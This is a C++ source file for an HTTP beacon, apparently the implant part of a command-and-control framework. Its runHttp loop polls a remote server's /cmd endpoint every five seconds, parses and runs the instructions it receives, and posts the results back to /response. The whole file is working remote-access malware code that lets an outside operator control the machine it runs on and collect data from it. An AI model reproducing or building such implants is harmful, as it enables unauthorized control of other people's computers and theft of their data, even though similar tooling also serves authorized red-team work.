#include "BeaconHttp.hpp"

#include <chrono>
#include <thread>


using namespace std;
using namespace httplib;


BeaconHttp::BeaconHttp(std::string& ip, int port)
	: Beacon(ip, port)
{
}


BeaconHttp::~BeaconHttp()
{
}


int BeaconHttp::runHttp()
{
	bool exit = false;
	while (!exit)
	{
		string cmd;

		httplib::Client cli(m_ip, m_port);

		if (auto res = cli.Get("/cmd")) 
		{
			if (res->status == 200) 
			{
				cmd = res->body;
				if (!cmd.empty())
				{
					C2Message c2Message;
					c2Message.ParseFromArray(cmd.data(), (int)cmd.size());
					C2Message c2RetMessage;

					exit = execInstruction(c2Message, c2RetMessage);

					string out;
					c2RetMessage.SerializeToString(&out);
					auto res2 = cli.Post("/response", out.data(), out.size(), "test");
				}
			}
		}
		else
		{
			auto err = res.error();
		}

		std::this_thread::sleep_for(std::chrono::milliseconds(5000));
	}

	return 0;
}